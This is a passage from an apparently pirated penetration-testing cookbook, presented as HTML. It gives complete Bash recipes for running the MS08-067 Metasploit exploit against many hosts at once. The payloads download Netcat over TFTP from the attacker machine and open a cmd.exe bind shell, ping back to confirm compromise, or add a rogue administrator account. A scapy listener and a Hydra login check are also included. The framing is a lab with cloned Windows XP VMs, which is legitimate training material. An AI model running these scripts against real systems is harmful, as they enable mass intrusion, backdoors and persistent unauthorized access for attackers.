            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EFFHC1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">By using separate terminals for each process, it is possible to execute multiple parallel exploits with a single Bash script. Additionally, by using an incrementing value for the <kbd class="calibre16">LPORT</kbd> assignment, it is possible to execute multiple reverse meterpreter shells simultaneously.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EGE1U1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Multithreaded MSF exploitation with backdoor executable</h1>
            

            <article>
                
<p class="calibre5">This recipe will demonstrate how to use Bash to exploit a single vulnerability across multiple systems and open a backdoor on each system. The backdoor consists of staging a Netcat executable on the target system and opening a listening service that will execute <kbd class="calibre16">cmd.exe</kbd> upon receiving a connection.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EHCIG1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have access to multiple systems that each have the same vulnerability that can be exploited with Metasploit. In the example provided, a VM running a vulnerable version of Windows XP was copied to generate three instances of the MS08-067 vulnerability. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and Nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EIB321-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how a Bash script can be used to exploit multiple instances of a single vulnerability simultaneously. This script in particular can be used to exploit multiple instances of the MS08-067 NetAPI vulnerability by referencing an input  list of IP addresses:</p>
<pre class="calibre24">
#!/bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;host file&gt;"; exit; fi<br class="title-page-name"/><br class="title-page-name"/>iplist=$1<br class="title-page-name"/><br class="title-page-name"/>i=4444<br class="title-page-name"/>for ip in $(cat $iplist)<br class="title-page-name"/>do<br class="title-page-name"/>  gnome-terminal -x msfconsole -x <br class="title-page-name"/>  "use exploit/windows/smb/ms08_067_netapi; set PAYLOAD windows/exec;<br class="title-page-name"/>   set RHOST $ip; set CMD cmd.exe /c tftp -i 172.16.69.133 GET nc.exe<br class="title-page-name"/>   &amp;&amp; nc.exe -lvp 4444 -e cmd.exe; run"<br class="title-page-name"/>   echo "Exploiting $ip and creating backdoor on TCP port 4444"<br class="title-page-name"/>i=$(($i+1))<br class="title-page-name"/>done
</pre>
<ol start="1" class="calibre20">
<li value="1" class="calibre19">This script is different from the one discussed in the previous recipe because this script installs a backdoor on each target. On each exploited system, a payload is executed that uses the integrated <strong class="calibre1">Trivial File Transfer Protocol</strong> (<strong class="calibre1">TFTP</strong>) client to grab the Netcat executable and then uses it to open up a listening <kbd class="calibre16">cmd.exe</kbd> terminal service on the TCP port <kbd class="calibre16">4444</kbd>.</li>
<li value="2" class="calibre19">For this to work, a TFTP service will need to be running on the Kali system. This can be done by issuing the following commands:</li>
</ol>
<div class="p"><img class="alignnone395" src="../images/00483.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">The first command starts the TFTP service on UDP port <kbd class="calibre16">69</kbd> with the service directory in <kbd class="calibre16">/tmp</kbd>. The second command is used to copy the Netcat executable from the <kbd class="calibre16">Windows binaries</kbd> folder to the TFTP directory.</li>
<li value="4" class="calibre19">Now, we execute the <kbd class="calibre16">./multipwn.sh</kbd> Bash shell:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00549.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">If the script is executed without supplying any arguments, the script will output the appropriate usage. This usage description will indicate that the script should be executed with an argument specifying the filename for a text file containing a list of target IP addresses.</li>
<li value="6" class="calibre19">Once executed with this argument, a series of new terminals will begin popping up. Each of these terminals will run the exploitation sequence of one of the IP addresses in the input list.</li>
<li value="7" class="calibre19">The original execution terminal will output a list of processes as they are executed and indicate that a backdoor will be created on each terminal.</li>
</ol>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">After the exploitation sequence has completed in each terminal, Netcat can be used to connect to the remote service that was opened by the payload:</li>
</ol>
<div class="p"><img class="alignnone396" src="../images/00615.jpeg"/></div>
<ol start="9" class="calibre20">
<li value="9" class="calibre19">In the example provided, connecting to TCP port <kbd class="calibre16">4444</kbd> on the successfully exploited system with IP address <kbd class="calibre16">172.16.69.140</kbd> yields remote access to a <kbd class="calibre16">cmd.exe</kbd> terminal service.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EJ9JK1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">Netcat is a highly functional tool that can be used for a variety of purposes. While this is an effective way to execute services remotely, it is not recommended that this technique be used on production systems. This is because the backdoor opened by Netcat can be accessed by anyone that can establish a TCP connection with the listening port.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EK8461-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Multithreaded MSF exploitation with ICMP verification</h1>
            

            <article>
                
<p class="calibre5">This recipe will demonstrate how to use Bash to exploit a single vulnerability across multiple systems and use ICMP traffic to validate the successful exploitation of each. This technique requires little overhead and can easily be used to gather a list of exploitable systems.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EL6KO1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have access to multiple systems that each have the same vulnerability that can be exploited with Metasploit. In the example provided, a VM running a vulnerable version of Windows XP was copied to generate three instances of the MS08-067 vulnerability. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EM55A1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how a Bash script can be used to exploit multiple instances of a single vulnerability simultaneously. This script in particular can be used to exploit multiple instances of the MS08-067 NetAPI vulnerability by referencing an input  list of IP addresses:</p>
<pre class="calibre24">
#!/bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;host file&gt;"; exit; fi<br class="title-page-name"/><br class="title-page-name"/>iplist=$1<br class="title-page-name"/><br class="title-page-name"/>for ip in $(cat $iplist)<br class="title-page-name"/>do<br class="title-page-name"/> gnome-terminal -x msfconsole -x <br class="title-page-name"/>  "use exploit/windows/smb/ms08_067_netapi; set RHOST $ip;<br class="title-page-name"/>   set PAYLOAD windows/exec; set CMD cmd.exe /c<br class="title-page-name"/>   ping 172.16.69.133 -n 1 -i 15; run"<br class="title-page-name"/>   echo "Exploiting $ip and pinging"<br class="title-page-name"/>i=$(($i+1))<br class="title-page-name"/>done
</pre>
<ol start="1" class="calibre20">
<li value="1" class="calibre19">This script differs from the one discussed in the previous recipe because the payload merely sends an ICMP echo request from the exploited system back to the attacking system.</li>
<li value="2" class="calibre19">The <kbd class="calibre16">-i</kbd> option is used while executing the <kbd class="calibre16">ping</kbd> command to specify a <strong class="calibre1">Time-To-Live</strong> (<strong class="calibre1">TTL</strong>) value of <kbd class="calibre16">15</kbd>. This alternate TTL value is used to distinguish exploit-generated traffic from normal ICMP traffic.</li>
<li value="3" class="calibre19">A custom listener Python script should also be executed to identify exploited systems by receiving the ICMP traffic.</li>
</ol>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">This script is as follows:</li>
</ol>
<pre class="calibre24">
        #!/usr/bin/python<br class="title-page-name"/><br class="title-page-name"/>        from scapy.all import *<br class="title-page-name"/>        import logging<br class="title-page-name"/>        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)<br class="title-page-name"/><br class="title-page-name"/>        def rules(pkt):<br class="title-page-name"/>              try:<br class="title-page-name"/>                    if ((pkt[IP].dst=="172.16.69.133") and<br class="title-page-name"/>                     (pkt[ICMP]) and pkt[IP].ttl &lt;= 15):<br class="title-page-name"/>                    print str(pkt[IP].src) + " is exploitable"<br class="title-page-name"/>             except:<br class="title-page-name"/>                  pass<br class="title-page-name"/><br class="title-page-name"/>        print "Listening for Incoming ICMP Traffic.<br class="title-page-name"/>         Use Ctrl+C to stop scanning"<br class="title-page-name"/>        sniff(lfilter=rules,store=0)
</pre>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">The script listens to all incoming traffic. When an ICMP packet is received with a TTL value of <kbd class="calibre16">15</kbd> or lower, the script flags the system as being exploitable:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00663.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">Listening for incoming ICMP traffic, use <em class="calibre15">Ctrl</em> + <em class="calibre15">C</em> to stop scanning. The Python traffic listener should be executed first. No output should be generated by the script initially. This script should continue to run throughout the duration of the exploitation process. Once the script is running, the Bash exploitation script should be launched.</li>
<li value="7" class="calibre19">When the script is executed, the original terminal shell will indicate that each system is being exploited and that the ping sequence is being executed. A new GNOME terminal will also be opened for each IP address in the input list. As each exploitation process is completed, the ICMP echo request should be initiated from the target system:</li>
</ol>
<div class="p"><img class="image-border141" src="../images/00046.jpeg"/></div>
<div class="p"/>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">Assuming the exploit is successful, the Python listening script will identify the generated traffic and will list each source IP address for the ICMP traffic as <kbd class="calibre16">exploitable</kbd>.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EN3LS1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">ICMP traffic might seem to be an unintuitive way of verifying the exploitability of target systems. However, it actually works very well. The single ICMP echo request leaves no trace of exploitation on the target system, and no excessive overhead is required. Also, the custom TTL value of <kbd class="calibre16">15</kbd> makes it highly unlikely that a false positive will be generated since nearly all systems begin with a TTL value of <kbd class="calibre16">128</kbd> or higher.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EO26E1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Multithreaded MSF exploitation with admin account creation</h1>
            

            <article>
                
<p class="calibre5">This recipe will demonstrate how to use Bash to exploit a single vulnerability across multiple systems and add a new administrator account on each system. This technique can be used to access compromised systems at a later time using integrated terminal services or SMB authentication.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EP0N01-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use the script demonstrated in this recipe, you will need to have access to multiple systems that each have the same vulnerability that can be exploited with Metasploit. In the example provided, a VM running a vulnerable version of Windows XP is copied to generate three instances of the MS08-067 vulnerability. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing a Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem using a text editor such as Vim or GNU nano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and GNU nano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EPV7I1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The example that follows demonstrates how a Bash script can be used to exploit multiple instances of a single vulnerability simultaneously. This script in particular can be used to exploit multiple instances of the MS08-067 NetAPI vulnerability by referencing an input list  of IP addresses:</p>
<pre class="calibre24">
#!/bin/bash<br class="title-page-name"/><br class="title-page-name"/>if [ ! $1 ]; then echo "Usage: #./script &lt;host file&gt; &lt;username&gt;<br class="title-page-name"/>&lt;password&gt;"; <br class="title-page-name"/>exit; fi<br class="title-page-name"/><br class="title-page-name"/>iplist=$1<br class="title-page-name"/>user=$2<br class="title-page-name"/>pass=$3<br class="title-page-name"/><br class="title-page-name"/>for ip in $(cat $iplist)<br class="title-page-name"/>do<br class="title-page-name"/>gnome-terminal -x msfconsole -x<br class="title-page-name"/>"use exploit/windows/smb/ms08_067_netapi; set RHOST $ip;<br class="title-page-name"/> set PAYLOAD windows/exec; set CMD cmd.exe /c net user<br class="title-page-name"/> $user $pass add &amp;&amp; net localgroup administrators $user add;<br class="title-page-name"/> run"<br class="title-page-name"/>echo "Exploiting $ip and adding user $user"<br class="title-page-name"/>i=$(($i+1))<br class="title-page-name"/>done
</pre>
<ol start="1" class="calibre20">
<li value="1" class="calibre19">This script is different from the previous multithreaded exploitation scripts because of the payload.</li>
<li value="2" class="calibre19">In this case, two sequential commands are executed upon successful exploitation. The first of these two commands creates a new user account named <kbd class="calibre16">hutch</kbd> and defines the associated password. The second command adds the newly created user account to the local administrators group:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00115.jpeg"/></div>
<ol start="3" class="calibre20">
<li value="3" class="calibre19">If the script is executed without supplying any arguments, the script will output the appropriate usage. This usage description will indicate that the script should be executed with an argument specifying the filename for a text file containing a list of target IP addresses.</li>
<li value="4" class="calibre19">Once executed with this argument, a series of new terminals will begin popping up. Each of these terminals will run the exploitation sequence of one of the IP addresses in the input list.</li>
<li value="5" class="calibre19">The original execution terminal will output a list of processes as they are executed and indicate that the new user account will be added on each. After the exploitation sequence has completed in each terminal, the system can then be accessed by integrated terminal services such as RDP or via remote SMB authentication.</li>
<li value="6" class="calibre19">To demonstrate that the account was added, Hydra is used to remotely log in to an exploited system using the newly added credentials:</li>
</ol>
<div class="p"><img class="image-border47" src="../images/00186.jpeg"/></div>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">Hydra indicates that the login with the newly created credentials was successful. This newly created account can then be used for further nefarious purposes, or a script could be used to test for the presence of the account to be used for validating the exploitation of vulnerabilities.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="EQTO41-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">By adding a user account on each executed system, an attacker can continue to perform subsequent actions on that system. There are both advantages and disadvantages to this approach. Adding a new account on the compromised system is faster than compromising existing accounts and can allow immediate access to existing remote services such as RDP. Alternatively, adding a new account is not very stealthy and can sometimes trigger alerts on host-based intrusion-detection systems.</p>
<p class="calibre5">This book was downloaded from AvaxHome!</p>
<p class="calibre5">Visit my blog for more new books:</p>
<p class="calibre5"><a href="https://tr.im/avaxhome" class="calibre6">https://avxhm.se/blogs/AlenMiler</a></p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    </body></html>